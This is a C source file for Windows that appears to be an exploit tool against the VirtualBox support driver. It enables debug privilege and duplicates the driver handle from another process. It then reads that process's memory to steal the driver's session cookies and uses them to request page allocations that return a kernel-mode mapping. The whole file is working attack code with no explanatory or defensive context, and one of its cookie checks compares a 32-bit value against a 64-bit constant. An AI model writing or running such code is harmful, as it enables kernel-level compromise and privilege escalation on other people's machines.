#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

static void EnableDebug(void) {
    HANDLE tok = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &tok);
    TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(tok);
}

#pragma pack(push,1)
typedef struct { DWORD c,sc,cbIn,cbOut,fl; int rc; } VBHdr;
typedef struct { VBHdr h; DWORD cP,fK,fU,iTLB; } VBAllocIn;
typedef struct { VBHdr h; UINT64 pvR3,pvR0; } VBAllocOut;
#pragma pack(pop)

int main(int argc, char* argv[]) {
    DWORD pid = argc > 1 ? (DWORD)atoi(argv[1]) : 0;
    USHORT hval = argc > 2 ? (USHORT)strtoul(argv[2], NULL, 16) : 0;
    if (!pid || !hval) { puts("Usage: scan.exe <pid> <handle_hex>"); return 1; }
    EnableDebug();

    // Duplicate the VBox handle
    HANDLE hp = OpenProcess(PROCESS_DUP_HANDLE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hp) { printf("OpenProcess err=%u\n", GetLastError()); return 1; }

    HANDLE vboxH = NULL;
    if (!DuplicateHandle(hp, (HANDLE)(ULONG_PTR)hval, GetCurrentProcess(), &vboxH, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
        printf("DupHandle err=%u\n", GetLastError()); CloseHandle(hp); return 1;
    }
    printf("Duped VBox handle\n");

    // Scan process memory for 0xC0FFEE followed by anything
    MEMORY_BASIC_INFORMATION mbi;
    BYTE* addr = NULL;
    UINT32 foundCK = 0, foundSCK = 0;

    while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & 0xCC)) {  // scan all types: private, mapped, image
            BYTE* buf = (BYTE*)malloc(mbi.RegionSize);
            SIZE_T read = 0;
            if (buf && ReadProcessMemory(hp, mbi.BaseAddress, buf, mbi.RegionSize, &read) && read > 8) {
                for (SIZE_T i = 0; i < read - 8; i += 4) {
                    UINT32 v = *(UINT32*)(buf + i);
                    if (v == 0xC0FFEEUL) {
                        UINT32 sck = *(UINT32*)(buf + i + 4);
                        if (sck != 0 && sck != 0xC0FFEEUL && sck != 0xFFFFFFFFFE0000FE) {
                            printf("Found at %p: ck=0x%08X sck=0x%08X\n",
                                (void*)((char*)mbi.BaseAddress + i), v, sck);
                            if (!foundCK) { foundCK = v; foundSCK = sck; }
                        }
                    }
                }
            }
            free(buf);
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(hp);

    if (!foundSCK) { puts("No session cookie found"); CloseHandle(vboxH); return 1; }
    printf("Using ck=0x%08X sck=0x%08X\n", foundCK, foundSCK);

    // Try PAGE_ALLOC with found cookies
    VBAllocIn req; memset(&req, 0, sizeof(req));
    req.h.c     = foundCK;
    req.h.sc    = foundSCK;
    req.h.cbIn  = sizeof(req);
    req.h.cbOut = (DWORD)(sizeof(VBAllocOut) + 8);
    req.cP = 1; req.fK = 1; req.fU = 1;

    VBAllocOut resp; memset(&resp, 0, sizeof(resp));
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(vboxH, 0x00228038, &req, sizeof(req), &resp, sizeof(resp)+8, &ret, NULL);
    printf("PageAlloc ok=%d err=%u ret=%u\n", ok, GetLastError(), ret);
    if (ok) printf("pvR3=0x%llX pvR0=0x%llX\n", resp.pvR3, resp.pvR0);

    CloseHandle(vboxH);
    return 0;
}
